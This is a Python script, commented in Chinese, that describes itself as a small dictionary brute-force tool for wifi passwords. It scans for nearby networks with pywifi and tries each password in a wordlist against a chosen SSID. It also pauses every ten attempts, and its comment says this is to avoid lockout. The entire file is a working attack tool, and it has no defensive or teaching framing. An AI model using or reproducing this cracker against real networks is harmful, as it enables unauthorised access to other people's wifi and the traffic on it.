# -*- coding: utf-8 -*-
# python 字典爆破wifi密码的小程序
import os
import time
import pywifi
from pywifi import const
from pywifi import Profile
import argparse


# 保证这两行只执行一次，不能写在循环体内，干脆直接使用全局变量 
# 保证只有一个wifi接口
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

def wifi_connect(iface, ssid, password):
    iface.disconnect()
    time.sleep(0.1)  # 等待断开连接

    if iface.status() == const.IFACE_DISCONNECTED:
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        
        print(f"尝试连接 SSID: {ssid} 使用密码: {password}")
        iface.connect(tmp_profile)
        time.sleep(0.2)  # 等待连接

        if iface.status() == const.IFACE_CONNECTED:
            print("连接成功")
            return True
        else:
            print("连接失败")
            return False
    else:
        print("接口未断开")
        return False

def scan_wifi():
    """扫描周围的WiFi:该功能需要windows打开定位服务，否则会报错"""
    try:
        iface.scan()
        time.sleep(1)  # 等待扫描结果
        scan_results = iface.scan_results()
        
        if not scan_results:
            print("扫描结果为空，请重试")
            return []

        wifi_list = []
        for network in scan_results:
            wifi_list.append((network.ssid, network.signal))
        wifi_list.sort(key=lambda x: x[1], reverse=True)  # 按信号强度排序
        return wifi_list
    except Exception as e:
        print(f"扫描WiFi时出错: {e}")
        return []


def crack_password(ssid, password_list):
    print("开始破解 wifi", ssid)
    print("使用密码本", password_list)
    with open(password_list, 'r') as file:
        for idx, line in enumerate(file):
            password = line.strip()
            if idx > 0 and idx % 10 == 0:
                print(f"已尝试 {idx} 个密码")
                time.sleep(1)  # 睡一秒，防止被锁
            if wifi_connect(iface, ssid, password):
                print(f"密码正确: {password}")
                break
            else:
                print(f"密码错误: {password}")



# 用于命令行调用
def main_cmd():
    parser = argparse.ArgumentParser(description="WiFi 字典爆破工具")
    parser.add_argument("ssid", help="要破解的WiFi名称")
    parser.add_argument("password_list", help="密码字典文件路径")
    args = parser.parse_args()

    crack_password(args.ssid, args.password_list)

if __name__ == "__main__":
    main_cmd()
